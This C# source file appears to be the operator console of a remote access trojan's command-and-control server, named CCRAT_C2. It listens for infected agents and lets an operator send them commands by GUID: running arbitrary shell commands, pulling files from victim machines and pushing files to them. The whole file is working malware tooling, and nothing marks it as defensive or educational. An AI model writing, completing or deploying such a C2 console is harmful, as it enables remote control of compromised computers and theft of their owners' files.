using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CCRAT_C2
{
    class Program
    {
        static void Main(string[] args)
        {
            C2Server c2 = new C2Server();
            c2.Listen();

            while (true)
            {
                Console.Write(">");
                string line = Console.ReadLine();
                if(line == "")
                {
                    continue;
                }
                string[] fields = line.Split(' ');
                try
                {
                    Guid agent = new Guid(fields[0]);
                    CommsPackage cp;
                    switch (fields[1])
                    {
                        case "exec":
                            cp = ExecComms(fields);
                            break;
                        case "download":
                            cp = ExecDownload(fields);
                            break;
                        case "upload":
                            cp = ExecUpload(fields);
                            break;
                        default:
                            cp = new CommsPackage();
                            break;
                    }
                    c2.SendCommand(agent, cp);
                }
                catch
                {
                    Console.WriteLine("Syntax error.");
                }
                

            }
        }
        private static CommsPackage ExecComms(string[] fields)
        {
            string command = "";
            for(int i = 2; i < fields.Length; i++)
            {
                command += fields[i] + " ";
            }
            CommsPackage cp = new CommsPackage();
            cp.Command = "exec";
            cp.Data = Encoding.UTF8.GetBytes(command);
            return cp;
        }

        private static CommsPackage ExecDownload(string[] fields)
        {
            CommsPackage cp = new CommsPackage();
            cp.Command = "download";
            FileInfo fi = new FileInfo();
            fi.Path = fields[2];
            cp.Data = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(fi));
            return cp;
        }

        private static CommsPackage ExecUpload(string[] fields)
        {
            CommsPackage cp = new CommsPackage();
            cp.Command = "upload";
            FileInfo fi = new FileInfo();
            fi.Path = fields[2];
            fi.Data = File.ReadAllBytes(fields[3]);
            cp.Data = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(fi));
            return cp;

        }
    }

}
